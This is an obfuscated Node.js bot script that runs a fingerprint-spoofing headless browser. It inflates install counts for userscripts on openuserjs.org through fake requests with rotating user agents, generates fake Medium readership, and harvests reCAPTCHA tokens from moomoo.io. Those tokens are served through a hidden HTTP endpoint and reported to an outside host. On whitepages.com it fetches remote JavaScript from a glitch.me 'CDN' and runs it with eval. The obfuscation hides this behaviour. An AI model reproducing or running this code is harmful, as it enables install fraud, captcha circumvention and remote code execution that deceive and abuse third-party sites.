      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': a0(0x18) + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + Z(0xc, 'S*D^') + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': a0(0x18) + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + a1(0x9) + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + a1(0xe) + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => -0xc * 0xad + -0x1139 + 0x1955
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    const a2 = b;
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](-0x1fea + -0xf * 0x23d + 0x417d)['vanillaLau' + a2(0x4, '[5tY')](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, -0x1 * -0x227f + -0xd60 + -0x14bb), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, -0x168 + 0x1c5 * -0x8 + 0xff4), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = -0xb28 + -0x9b9 + 0x1 * 0x14e1;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = -0x10f * 0x11 + 0x3fd * 0x7 + 0x2 * -0x4f6; w < getRandomInt(0x1 * -0x14a1 + -0xef6 + -0x11cc * -0x2, 0x1 * -0x18ca + 0x15a1 + -0x1 * -0x32e); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(-0x170f7 + -0x4abc + 0x2a613);
        }
      }();
    }, 0xc5b + 0x883 + -0x147a), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = -0x178f + -0xce2 + -0x1eb * -0x13;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](-0x17d9 + -0x10e2 + 0x28bb, -0x11fe + -0x2178 + 0x4c * 0xae)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, -0x8f * 0xd3 + -0xe49d + 0x1cfaa);
    }, 0x7f * -0x43 + 0x1 * 0xd03 + -0xb6 * -0x1d), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = 0x2593 * 0x1 + 0x63a + -0x1 * 0x2bcd;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(0xdea + -0x1981 * 0x1 + 0x174f), await u['evaluate'](() => {
            const a3 = b;
            let v = new XMLHttpRequest();
            v['open']('GET', a3(0x1, 'Y3A^') + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', -0x21c9 + -0x8ed + 0x2ab6), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(0x17d6b4 + 0xec838 + -0x2 * 0xc71a6);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, 0x1e99 + -0x7d3 * 0x3 + -0x6bc);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const i = url['parse'](f['url'])['pathname'];
    h['writeHead'](-0x1 * -0x134f + 0x102d * 0x1 + 0x4 * -0x8ad);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || -0x1721 * 0x2 + -0x2 * -0x109f + 0x2c94);
}
doFlags['doOUJS'] && ((async () => {
  async function f() {
    const k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = -0x8e5 + -0x1b9e + -0x6 * -0x616) {
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (-0x1386 + -0xd71 * -0x1 + 0x616));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](0x93 + 0x6ed * 0x3 + -0x6 * 0x38f, D['indexOf']('\x20'));
        return B ? E['slice'](-0x2 * -0x10bf + 0x1943 + 0x3ac1 * -0x1, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](-0xb69 * -0x4 + 0x14ef * 0x3 + 0x1 * -0x4561),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](0x1 * -0x13f3 + 0x23de + 0x1725),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = -0x1ac * -0x7 + -0x1f68 + 0x13b4; k < 0x127 * 0x21 + 0x1626 + -0x3c29; k++)
    setTimeout(f, (0x5319 + -0x8 * 0x2ec0 + 0x1 * 0x20d47) * k * getRandomInt(-0x18e1 + 0x5 * -0x1e0 + 0x2242, -0x21bd + -0x1f9 + 0x23b9));
  setInterval(() => {
    f();
    for (let l = 0x1 * 0x1921 + -0x23ad * 0x1 + 0xa8c; l < 0x16e1 * -0x1 + 0x5 * -0x17 + 0x1758; l++)
      setTimeout(f, (0x1 * -0x10cb3 + 0x7a23 + 0x17cf0) * l * getRandomInt(0x10d4 + -0x1701 + 0x62e * 0x1, 0xddd * -0x1 + -0x1cc7 + 0x2aa7));
  }, -0x571f * -0x134 + 0x5 * -0xfbb8a + 0x1cc6e6);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
